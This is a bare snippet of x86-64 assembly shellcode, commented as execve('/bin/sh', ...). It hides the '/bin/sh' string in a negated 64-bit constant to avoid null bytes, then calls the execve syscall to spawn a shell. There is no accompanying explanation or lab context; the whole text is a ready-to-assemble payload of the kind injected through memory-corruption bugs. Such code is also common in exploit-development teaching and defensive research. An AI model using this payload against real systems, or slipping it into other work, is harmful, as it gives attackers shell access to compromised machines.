;execve("/bin/sh", ["/bin/sh", NULL], [NULL])
xor	rax, rax
mov	rbx, 0xFF978CD091969DD1
neg	rbx
push	rbx
push	rsp
pop	rdi
cdq
push	rdx
push	rdi
push	rsp
pop	rsi
mov	al, 0x3b
syscall
